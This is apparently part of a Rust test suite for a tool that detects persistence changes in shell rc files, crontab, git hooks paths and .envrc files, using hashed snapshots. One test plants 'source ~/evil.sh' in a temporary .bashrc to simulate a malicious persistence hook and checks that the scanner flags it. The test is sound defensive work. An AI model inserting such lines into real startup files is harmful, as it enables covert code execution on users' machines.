        std::fs::write(&path, b"{}").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        save_snapshot(&path, &PersistenceSnapshot::default()).unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "snapshot must be 0600, got {mode:o}");
    }

    #[test]
    fn crontab_absence_is_empty_not_present() {
        // A failing crontab shell-out yields an absent, empty, well-formed entry.
        let entry = crontab_entry();
        assert_eq!(entry.sha256.len(), 64);
        assert_eq!(entry.size, entry.content.len());
        assert_eq!(entry.kind, PersistenceKind::Crontab);
    }

    #[test]
    fn empty_home_first_scan_yields_no_change() {
        let home = tempdir().unwrap();
        let snap = snapshot_then(home.path(), None);
        // Re-diff with no mutation: all surfaces absent and unchanged.
        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(findings.is_empty());
    }

    #[test]
    fn diff_against_empty_snapshot_reports_present_surfaces() {
        let home = tempdir().unwrap();
        std::fs::write(home.path().join(".zshrc"), b"alias g=git\n").unwrap();
        // Empty snapshot (no baseline). A present rc file with no prior record
        // counts as a change.
        let empty = PersistenceSnapshot::default();
        let findings = diff_against_snapshot(home.path(), None, &empty);
        assert!(rule_ids(&findings).contains(&RuleId::PersistenceShellRcModified));
    }

    #[test]
    fn snapshot_round_trips_through_disk() {
        let dir = tempdir().unwrap();
        let home = tempdir().unwrap();
        std::fs::write(home.path().join(".bashrc"), b"alias l=ls\n").unwrap();
        let entries = scan_with_root(home.path(), None);
        let snap = PersistenceSnapshot::from_entries(&entries);

        let path = dir.path().join("snap.json");
        save_snapshot(&path, &snap).unwrap();
        let loaded = load_snapshot(&path);
        assert_eq!(loaded.schema_version, 1);
        assert!(loaded.entries.contains_key("shell_rc:.bashrc"));
        // Per-line hashes survive the round-trip (not cleartext) so a later diff still works.
        let lh = &loaded.entries["shell_rc:.bashrc"].line_hashes;
        assert!(lh.contains(&line_hash("alias l=ls")), "{lh:?}");
        assert!(!lh.contains(&line_hash("alias x=cat")), "{lh:?}");

        // End-to-end: a later diff against the hash-only snapshot surfaces the added line.
        std::fs::write(
            home.path().join(".bashrc"),
            b"alias l=ls\nsource ~/evil.sh\n",
        )
        .unwrap();
        let findings = diff_against_snapshot(home.path(), None, &loaded);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceShellRcModified)
            .expect("a later diff against the hash-only snapshot must still fire");
        assert!(
            f.added_lines.iter().any(|l| l.contains("evil.sh")),
            "{:?}",
            f.added_lines
        );
    }

    #[test]
    fn git_hooks_path_parsed_from_gitconfig() {
        assert_eq!(
            parse_git_hooks_path("[core]\n\thooksPath = /opt/hooks\n").as_deref(),
            Some("/opt/hooks")
        );
        assert_eq!(
            parse_git_hooks_path("core.hooksPath = ~/.githooks\n").as_deref(),
            Some("~/.githooks")
        );
        assert_eq!(parse_git_hooks_path("[user]\n\tname = x\n"), None);
    }

    #[test]
    fn envrc_ancestry_walk_finds_parent_envrc() {
        let root = tempdir().unwrap();
        let child = root.path().join("a").join("b");
        std::fs::create_dir_all(&child).unwrap();
        std::fs::write(root.path().join(".envrc"), b"use node\n").unwrap();

        let entries = collect_envrc_ancestry(&child);
        assert!(
            entries.iter().any(|e| e.kind == PersistenceKind::Direnv),
            "ancestry walk should find the parent .envrc, got {entries:?}"
        );
    }
}
